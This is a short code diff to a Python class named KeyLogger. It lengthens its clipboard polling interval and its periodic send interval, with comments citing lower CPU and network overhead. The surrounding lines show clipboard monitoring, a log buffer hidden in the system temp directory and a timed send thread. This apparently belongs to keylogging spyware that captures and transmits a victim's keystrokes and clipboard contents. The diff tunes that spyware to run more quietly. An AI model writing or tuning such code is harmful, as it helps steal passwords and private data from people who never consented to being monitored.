@@ -115,7 +115,7 @@ class KeyLogger:
         # Clipboard monitoring
         self.last_clipboard_content = None
         self.clipboard_monitor_thread = None
-        self.clipboard_check_interval = 0.5  # Check every 500ms
+        self.clipboard_check_interval = 1.0  # Check every 1 second (reduced from 0.5s for less CPU)
         
         # RAM storage (temp directory)
         self.temp_dir = Path(tempfile.gettempdir()) / "keylog_buffer"
@@ -125,7 +125,7 @@ class KeyLogger:
         
         # Send timer thread
         self.send_thread = None
-        self.send_interval = 180  # 3 minutes
+        self.send_interval = 300  # 5 minutes (increased from 3 minutes for less network overhead)
         
     def create_new_log_file(self):
         """Create a new log file with timestamp"""
